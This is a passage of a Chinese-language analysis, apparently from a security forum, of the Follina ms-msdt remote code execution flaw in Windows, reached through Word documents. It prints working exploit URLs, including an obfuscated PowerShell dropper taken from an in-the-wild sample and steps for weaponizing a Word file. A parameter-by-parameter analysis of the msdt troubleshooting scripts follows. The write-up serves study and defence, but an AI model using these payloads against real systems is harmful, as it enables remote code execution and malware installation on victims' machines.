@@ -1,0 +1,78 @@
+
+| 1 | `window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";` |
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_S42F2VE6B77P7FV.png)
+
+保留其中的`\$cmd=c:\\windows\\system32\\cmd.exe\";Start-Process \$cmd;`，使用其 base64 编码后的数据替换原先的数据。启动 HTTP 服务器使这个`html`可以被访问到，修改word文件中`word/\_rels/document.xml.rels`的目标链接，打开文档触发漏洞。
+
+| 1  2 | `//` 通过 `IT_BrowseForFile` 指定的程序不一定要存在，但必须是 `exe` 或 `msi` 结尾的  `window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZD0nYzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlJztTdGFydC1Qcm9jZXNzICRjbWQ7'+[char]34+'))'))))/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";` |
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_WE6S4EQR95FP2H9.png)
+
+也可以使用文章中给的缩减版本 `location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT\_RebrowseForFile=? IT\_LaunchMethod=ContextMenu IT\_BrowseForFile=/../../\$(calc)/.exe\"";`，效果如下：
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_3BNP8MHHSXS9CDK.png)
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_ZS5PGXUFYCHJTUV.png)
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_NF6Y8AE235E87NZ.png)
+
+另外，Office 虽然不是这个漏洞的根源，但却是这个漏洞进行远程利用的因素之一。对此，微软已经推送了 5 月版本 **16.0.15225.20204**，Office 2019、Office 2021 以及 Office 365 可以自动更新到这个版本。之前的版本中，打开恶意文档 Word 程序会查询 `HKCR\ms-msdt\` 下的注册表值，`HKCR\ms-msdt\shell\open\command` 中存放着 `ms-msdt` 的 `"%SystemRoot%\system32\msdt.exe" %1`的处理程序以及启动方式。而更新后的 Word 不会对 `HKCR\ms-msdt\` 进行任何查询，这意味着已经无法通过 Word 去处理 `ms-msdt` 协议，从而调用存在漏洞的 `msdt` 程序，这也在一定程度上缓解了漏洞。
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_UGSDEBFTU7Z6TZ4.png)
+
+## 漏洞分析
+
+### 1. msdt 初体验
+
+使用 Word 等应用程序打开恶意样本会去请求目标链接，并解析其中的内容，由于其中包含 `ms-msdt:`，会调用 `msdt` 程序进行处理，所以这些程序只是远程利用这个漏洞的跳板（选用这些程序是因为它们在调用 `msdt` 的过程中不会向用户提示），实际产生漏洞的位置还是 `msdt`。`msdt`（Microsoft Support Diagnostics Tool，Microsoft 诊断故障排除向导）用于排除故障并收集诊断数据以供支持专业人员分析以解决问题，微软有官方文档对其进行介绍：
+
+[50cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8K6k6i4u0$3k6i4u0Q4x3V1k6S2k6r3#2A6L8X3W2K6N6s2u0S2N6r3W2G2L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8U0L8$3#2E0j5h3&6V1M7#2)9J5c8X3#2K6k6s2b7`.](https://bbs.kanxue.com/elink@15aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8K6k6i4u0$3k6i4u0Q4x3V1k6S2k6r3#2A6L8X3W2K6N6s2u0S2N6r3W2G2L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8U0L8$3#2E0j5h3&6V1M7#2)9J5c8X3#2K6k6s2b7`.)
+
+在我写文章的时候已经有这样一份分析：
+
+[8d4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6&6y4r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3M7r3!0K6N6q4)9J5c8X3k6G2L8r3I4A6L8X3q4Q4x3X3c8E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3c8G2k6X3k6A6j5$3g2Q4x3X3c8J5j5$3g2Q4x3X3c8%4K9i4c8Z5i4K6u0V1L8i4y4Q4x3X3c8E0M7$3c8@1i4K6u0V1M7s2u0G2N6r3!0U0L8$3I4Q4x3V1j5`.](https://bbs.kanxue.com/elink@816K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6&6y4r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3M7r3!0K6N6q4)9J5c8X3k6G2L8r3I4A6L8X3q4Q4x3X3c8E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3c8G2k6X3k6A6j5$3g2Q4x3X3c8J5j5$3g2Q4x3X3c8%4K9i4c8Z5i4K6u0V1L8i4y4Q4x3X3c8E0M7$3c8@1i4K6u0V1M7s2u0G2N6r3!0U0L8$3I4Q4x3V1j5`.)
+
+下面进入动手环节，使用 Process Monitor 监测`msdt.exe`，可以发现它的启动命令行是 `msdt ms-msdt:/id PCWDiagnostic /skip force /param "IT\_RebrowseForFile=cal?c IT\_LaunchMethod=ContextMenu IT\_SelectProgram=NotList IT\_BrowseForFile=/../../\$(calc)/.exe IT\_AutoTroubleshoot=ts\_AUTO"`，这给我们测试又提供了方便，这里没有直接用`msdt /id PCWDiagnostic`呢。
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_MTMBVZZJVVM6ZRV.png)
+
+a. 经过测试发现，`/skip force` 和自动下一步相关，如果不加这个参数，就需要用户点击下一页才能触发漏洞
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_H3Q75HZ6RYK27NM.png)
+
+b. `IT\_LaunchMethod=ContextMenu` 和 `IT\_SelectProgram=NotList` 这两个参数和程序选择相关，要利用漏洞需要选择未列出，如果参数中有 `IT\_LaunchMethod=ContextMenu` 和 `IT\_SelectProgram=NotList` 就会自动选择未列出，如果参数中只有 `IT\_LaunchMethod=ContextMenu` 效果也是一样的，否则需要用户选择“未列出”并单击下一页才能触发漏洞
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_RZWJS8MDCA6ZFB4.png)
+
+c. 参数 `IT\_AutoTroubleshoot=ts\_AUTO` 和触发漏洞没有什么特别联系，huntress 的文章中已经将其删减掉了
+
+d. 参数 `IT\_RebrowseForFile=cal?c` 在本地测试是不需要的，但远程触发的话还是需要一个参数并且值里面带 `"?"` 字符，这个参数可以是 `IT\_RebrowseForFile`，也可以是 `"ss"` 等
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_J8ZNGBVMR77J2RV.png)
+
+e. 最后是 `/id PCWDiagnostic`，通过 id 指定要运行的诊断包。这里表示使用 PCW 诊断，其帮助用户配置旧程序，以便它们可以在当前版本的 Windows 中运行（刚刚已经体验过这个故障排除包的流程）。最终测试出的命令和文章上一致：
+
+|  |  |
+| --- | --- |
+| 1 | `msdt ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc)/.exe"` |
+
+### 2. PCWDiagnostic 探索
+
+使用 Process Monitor 监测`msdt.exe`，会发现有对 `C:\Windows\diagnostics\system\PCW` 目录下的 powershell 文件的读取。而 `C:\Windows\diagnostics\system\PCW` 目录正好对应了 `PCWDiagnostic`
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_Z5F6YFWYVQRV26N.png)
+
+通过搜索关键字，可以发现 `IT\_BrowseForFile` 参数是在 `TS\_ProgramCompatibilityWizard.ps1` 文件中处理的，如下代码所示，看 else 那段代码（if 那块应该不会走到），如果用户选择了 `NotListed` 就会通过 `Get-DiagInput -id IT\_BrowseForFile` 获取 `\$selectedProgram`，而 `IT\_BrowseForFile` 指定为了 `"/../../\$(calc)/.exe"`
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_NSRBYR74GVTDHXS.png)
+
+然后会调用 `Test-Selection` 进行判断，如果程序的后缀是 `".exe"` 或者 `".msi"`，会将 `appValid` 赋值为 True，否则就是 False
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_8H6BNAW9TC63QBF.png)
+
+如果 `\$UpdateChoice` 为 `ts\_Manual`，就会调用 `Update-DiagRootCause -id "RC\_IncompatibleApplication" -iid \$appName -Detected \$true -parameter @{ "TARGETPATH" = \$selectedProgram; "APPNAME" = \$appName}` 去更新根本原因的状态，参数分别是 `selectedProgram` 和 `appName`，其中 `selectedProgram` 由 `Get-DiagInput -id IT\_BrowseForFile` 获取，`appName` 由 `` `[System.IO.Path]::GetFileNameWithoutExtension(\$selectedProgram).Replace("\$", "`\$")` `` 获取。除了前面讲的这些，`selectedProgram` 还被 `\$type::GetAppInfoFromCOS` 处理过，但看样子不会出现命令执行
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_FGPMRTWJS2DJ4AP.png)
+
+以下是 `DiagPackage.diagpkg` 中的部分内容，可以得知：`TS\_ProgramCompatibilityWizard.ps1`、`RS\_ProgramCompatibilityWizard.ps1`、`VF\_ProgramCompatibilityWizard.ps1` 分别为故障排除程序脚本、解析程序脚本和验证程序脚本，其中 `RS\_ProgramCompatibilityWizard.ps1` 的两个参数正好是 `TargetPath` 和 `AppName`
